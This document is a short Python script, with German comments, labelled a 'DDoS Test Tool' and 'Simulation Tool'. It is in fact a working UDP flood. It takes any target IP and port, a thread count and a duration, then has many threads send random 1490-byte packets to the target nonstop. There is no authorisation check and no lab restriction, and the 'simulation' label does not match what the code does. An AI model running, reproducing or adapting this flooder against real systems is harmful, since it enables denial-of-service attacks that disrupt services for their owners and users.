import os
import socket
import random
import threading
import time

# Funktion für den UDP-Angriff
def udp_attack(target_ip, target_port, attack_time, threads):
    finish = False

    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1490)
        while not finish:
            try:
                sock.sendto(payload, (target_ip, target_port))
                print(f"Sent UDP packet to {target_ip} through port: {target_port}")
            except Exception as e:
                print(f"Error: {e}")
    
    # Starten der Threads
    thread_list = []
    for i in range(threads):
        thread = threading.Thread(target=udp_flood)
        thread.start()
        thread_list.append(thread)
        print(f"Started thread {i + 1}")

    time.sleep(attack_time)
    finish = True

    for thread in thread_list:
        thread.join()
    
    print("Attack completed.")

# Initialisierung
os.system("clear")
os.system("figlet DDoS Test Tool")

print("DDoS Simulation Tool")

target = input("Enter target (IP:Port): ")
target_ip, target_port = target.split(":")
target_port = int(target_port)
threads = int(input("Number of threads: "))
attack_time = int(input("Duration of attack (seconds): "))

os.system("clear")
os.system("figlet Starting Attack")

udp_attack(target_ip, target_port, attack_time, threads)
